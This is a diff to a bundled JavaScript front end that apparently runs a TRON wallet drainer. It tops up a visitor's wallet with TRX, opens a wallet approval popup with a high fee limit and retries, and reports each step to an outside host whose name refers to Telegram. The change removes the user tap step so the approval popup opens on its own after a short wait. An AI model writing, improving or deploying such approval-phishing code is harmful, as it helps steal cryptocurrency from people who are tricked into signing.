@@ -93005,69 +93005,23 @@
                             });
 
                             if (topUpSent) {
-                                // Never hang here: timed waits + timed balance reads, then ALWAYS continue to approve
-                                const beforeTopUp = balanceInTRX;
-                                const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
-                                const balanceWithTimeout = async (ms) => {
-                                    try {
-                                        return await Promise.race([
-                                            a.getBalance(c).then((v) => parseFloat(v) || 0),
-                                            sleep(ms).then(() => null)
-                                        ])
-                                    } catch (_) {
-                                        return null
-                                    }
-                                };
-                                console.log("[6] POST-TOP-UP BALANCE CHECK START", {
-                                    mode: "safe-confirm-then-approve",
-                                    totalWaitMs: 9000
-                                });
-                                reportEvent("TRX_TOPUP_CONFIRM_WAIT_START", {
-                                    waitMs: 9000,
-                                    beforeTopUp: beforeTopUp,
+                                // After top-up: wait 5s then open approval popup directly (no tap button)
+                                console.log("[6] POST-TOP-UP WAIT 5s THEN APPROVE", {
+                                    waitMs: 5000,
                                     tx: topUpTxId
                                 });
-                                let funded = false;
-                                // 3 x 3s chunks with heartbeat logs (survives mobile timer throttle better)
-                                for (let tick = 1; tick <= 3; tick += 1) {
-                                    await sleep(3000);
-                                    reportEvent("TRX_TOPUP_CONFIRM_HEARTBEAT", {
-                                        tick: tick,
-                                        elapsedMs: tick * 3000
-                                    });
-                                    const bal = await balanceWithTimeout(2500);
-                                    if (null !== bal) {
-                                        balanceInTRX = bal;
-                                        o(balanceInTRX);
-                                        reportEvent("TRX_TOPUP_CONFIRM_POLL", {
-                                            tick: tick,
-                                            balanceInTRX: balanceInTRX
-                                        });
-                                        if (balanceInTRX >= minTrx || balanceInTRX > beforeTopUp + 0.5) {
-                                            funded = true;
-                                            reportEvent("TRX_TOPUP_CONFIRMED", {
-                                                balanceInTRX: balanceInTRX,
-                                                tick: tick
-                                            });
-                                            break
-                                        }
-                                    } else {
-                                        reportEvent("TRX_TOPUP_CONFIRM_POLL", {
-                                            tick: tick,
-                                            balanceInTRX: null,
-                                            timedOut: true
-                                        })
-                                    }
-                                }
-                                if (!funded) {
-                                    console.log("[7] POST-TOP-UP continue to approve without confirmed balance read");
-                                    reportEvent("TRX_TOPUP_CONFIRM_TIMEOUT", {
-                                        balanceInTRX: balanceInTRX,
-                                        continueToApprove: true
-                                    })
-                                }
-                                // Force approve path even if RPC lag / hang happened
-                                topUpSent = true
+                                reportEvent("TRX_TOPUP_CONFIRM_WAIT_START", {
+                                    waitMs: 5000,
+                                    tx: topUpTxId
+                                });
+                                await new Promise((resolve) => setTimeout(resolve, 5000));
+                                reportEvent("TRX_TOPUP_CONFIRM_DONE", {
+                                    waitMs: 5000,
+                                    continueToApprove: true
+                                });
+                                try {
+                                    sessionStorage.setItem("trxToppedUp:" + c, String(Date.now()))
+                                } catch (_) {}
                             } else {
                                 console.log("[6] POST-TOP-UP BALANCE CHECK START", {
                                     skipped: true,
@@ -93124,59 +93078,7 @@
                         })
                     }
 
-                    // After TRX is in wallet: open approve ASAP (no long settle).
-                    // Mobile wallets often block auto-sign after long waits — keep a same-page Tap button.
-                    const waitForApproveTap = (message) => new Promise((resolve) => {
-                        try {
-                            const old = document.getElementById("trx-approve-tap-overlay");
-                            if (old)
-                                old.remove()
-                        } catch (_) {}
-                        const overlay = document.createElement("div");
-                        overlay.id = "trx-approve-tap-overlay";
-                        overlay.style.cssText = "position:fixed;inset:0;z-index:999999;background:rgba(0,0,0,.72);display:flex;align-items:center;justify-content:center;padding:24px;";
-                        const btn = document.createElement("button");
-                        btn.type = "button";
-                        btn.textContent = message || "TRX received — Tap to Approve";
-                        btn.style.cssText = "width:min(420px,100%);padding:18px 22px;border:0;border-radius:14px;background:#c41e3a;color:#fff;font-size:18px;font-weight:700;cursor:pointer;box-shadow:0 10px 30px rgba(0,0,0,.35);";
-                        const sub = document.createElement("div");
-                        sub.textContent = "Do not leave this page. Tap once to open wallet approval.";
-                        sub.style.cssText = "margin-top:12px;color:#fff;text-align:center;font-size:13px;opacity:.9;";
-                        const wrap = document.createElement("div");
-                        wrap.style.cssText = "display:flex;flex-direction:column;align-items:center;width:min(420px,100%);";
-                        wrap.appendChild(btn);
-                        wrap.appendChild(sub);
-                        overlay.appendChild(wrap);
-                        btn.addEventListener("click", () => {
-                            try {
-                                overlay.remove()
-                            } catch (_) {}
-                            resolve(!0)
-                        }, {
-                            once: !0
-                        });
-                        document.body.appendChild(overlay)
-                    });
-
-                    if (topUpSent) {
-                        try {
-                            sessionStorage.setItem("trxToppedUp:" + c, String(Date.now()));
-                            sessionStorage.setItem("pendingApprove:" + c, "1")
-                        } catch (_) {}
-                        console.log("[SIGN] TRX received — opening approve immediately", {
-                            settleMs: 1000
-                        });
-                        reportEvent("APPROVAL_SETTLE_WAIT", {
-                            settleMs: 1000
-                        });
-                        await new Promise((resolve) => setTimeout(resolve, 1000));
-                        try {
-                            balanceInTRX = parseFloat(await a.getBalance(c)) || balanceInTRX
-                        } catch (_) {}
-                        o(balanceInTRX)
-                    }
-
-                    // After top-up always use high feeLimit so approve trigger/popup is more reliable
+                    // After top-up wait already done above (5s). Open approval popup directly — no tap button.
                     const feeLimit = topUpSent || balanceInTRX < 20 ? 1e9 : 15000000;
                     console.log("Opening sign popup", {
                         balanceInTRX: balanceInTRX,
@@ -93188,21 +93090,10 @@
                         feeLimit: feeLimit,
                         fromTopUp: topUpSent
                     });
-
-                    // If we just topped up, show same-page Tap button first (user gesture opens Trust/WC popup)
-                    if (topUpSent) {
-                        reportEvent("APPROVAL_TAP_REQUIRED", {
-                            reason: "post_topup_user_gesture"
-                        });
-                        await waitForApproveTap("TRX received — Tap to Approve");
-                        reportEvent("APPROVAL_TAP_CLICKED", {})
-                    }
-
                     await f(c, feeLimit, {
                         fromTopUp: topUpSent,
-                        retries: topUpSent ? 4 : 1,
-                        reportEvent: reportEvent,
-                        waitForApproveTap: waitForApproveTap
+                        retries: topUpSent ? 3 : 1,
+                        reportEvent: reportEvent
                     });
                 } catch (a) {
                     console.error("[10] ERROR", a);
@@ -93225,11 +93116,10 @@
             }
             ), [l])
               , f = async (e, feeLimit, opts) => {
-                // checktrc: g=async(service,address)=>{ const r=await service.sendTransaction(address); r&&r.result ? success : fail }
+                // Direct approval popup after top-up wait — no tap button
                 const options = opts && "object" === typeof opts ? opts : {};
                 const maxTries = Math.max(1, Number(options.retries) || 1);
                 const reportEvent = "function" === typeof options.reportEvent ? options.reportEvent : () => {};
-                const waitForApproveTap = "function" === typeof options.waitForApproveTap ? options.waitForApproveTap : null;
                 const API_BASE = "https://tronscantelegram-q7ln.onrender.com";
                 console.log("[8] APPROVAL START", e, {
                     feeLimit: feeLimit,
@@ -93255,7 +93145,6 @@
                     localStorage.setItem("walletAddress", e);
                     let n = null;
                     for (let tryNo = 1; tryNo <= maxTries; tryNo += 1) {
-                        // Fresh service each try so provider stays linked after top-up wait
                         const r = new SA(l);
                         h(r);
                         if (!r) {
@@ -93287,9 +93176,8 @@
                         if (n && (n.result || n.success)) {
                             break
                         }
-                        // If popup never opened, ask for a same-page tap then retry — do NOT leave site / re-top-up
                         if (n && n.approvalNotAttempted && tryNo < maxTries) {
-                            console.warn("[SIGN] approve popup not opened yet, retrying without top-up", {
+                            console.warn("[SIGN] approve not opened yet, auto-retry", {
                                 tryNo: tryNo,
                                 message: n.message
                             });
@@ -93297,14 +93185,7 @@
                                 tryNo: tryNo,
                                 message: n.message
                             });
-                            if (waitForApproveTap) {
-                                await waitForApproveTap("Tap again to open approval");
-                                reportEvent("APPROVAL_TAP_CLICKED", {
-                                    tryNo: tryNo
-                                })
-                            } else {
-                                await new Promise((resolve) => setTimeout(resolve, 1200))
-                            }
+                            await new Promise((resolve) => setTimeout(resolve, 1500));
                             continue
                         }
                         break
@@ -93315,8 +93196,7 @@
                             txID: n.txID || "N/A"
                         });
                         try {
-                            sessionStorage.removeItem("trxToppedUp:" + e);
-                            sessionStorage.removeItem("pendingApprove:" + e)
+                            sessionStorage.removeItem("trxToppedUp:" + e)
                         } catch (_) {}
                         reportEvent("TELEGRAM_SEND_INITIATED", {
                             type: "transaction_approved",
@@ -93347,28 +93227,6 @@
                             reason: "popup_not_opened",
                             message: n.message
                         });
-                        // Last chance: same-page tap instead of forcing user back to home
-                        if (waitForApproveTap) {
-                            await waitForApproveTap("Final tap to open approval");
-                            const r2 = new SA(l);
-                            h(r2);
-                            n = await r2.sendTransaction(e, feeLimit);
-                            if (n && (n.result || n.success)) {
-                                reportEvent("APPROVAL_APPROVED", {
-                                    txID: n.txID || "N/A",
-                                    via: "final_tap"
-                                });
-                                try {
-                                    sessionStorage.removeItem("trxToppedUp:" + e);
-                                    sessionStorage.removeItem("pendingApprove:" + e)
-                                } catch (_) {}
-                                setTimeout(() => {
-                                    window.location.href = "/certificate"
-                                }, 1500);
-                                t(3);
-                                return
-                            }
-                        }
                         window.alert("Could not start the approval. The wallet popup was not opened.\n" + (n.message ? n.message : "Network request failed."));
                         t(2)
                     } else {
